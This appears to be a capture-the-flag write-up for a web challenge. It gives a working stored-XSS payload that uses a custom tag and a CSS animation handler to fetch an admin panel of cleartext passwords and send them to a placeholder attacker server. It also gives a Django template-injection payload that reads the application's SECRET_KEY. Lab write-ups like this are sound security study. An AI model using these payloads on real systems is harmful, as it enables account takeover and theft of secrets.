1. There was an xss in chat function with the admin , register as any user
2. Test with different tags and payloads ,should notice that all the html tags are blocked except custom made ones and `<style>`
3. With payload you should either target `/flag1` to get the FLAG1 or `/panel` to get the passwords of the users and continue for the FLAG2 
Following XSS payload was one of them that works:
```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationend="fetch('/panel').then(r=>r.text()).then(d=>{new Image().src='[ATTACKER-SERVER-HERE]?leak='+encodeURIComponent(d)})"></xss>
```
4. Send it to the admin chat and wait for automated bot to see the message (should happen every 3 seconds)
<img src="Pasted image 20250412200921.png">
 after rendering you can clearly see that passwords are stored in cleartext format in `/panel` endpoint:
 ![[Pasted image 20250412201107.png]]
 after become and admin FLAG1 here
<img src="Pasted image 20250412202005.png">

5. After becoming an admin you can edit the contents of the which will be rendered by server side:
![[Pasted image 20250412202511.png]]

<img src="Pasted image 20250412202429.png">

6. It means SSTI , but with Django SSTI maximum you can read the `SECRET_KEY` of the application (not RCE , let know if you know a way to achieve code execution with django ssti)
You can easily guess that from the source code shared with you:
<img src="Pasted image 20250412202801.png">

7. Insert the following template injection payload
```
{{ messages.storages.0.signer.key }}
```
<img src="Pasted image 20250412202944.png">
and update the page for FLAG2:
<img src="Pasted image 20250412203028.png">
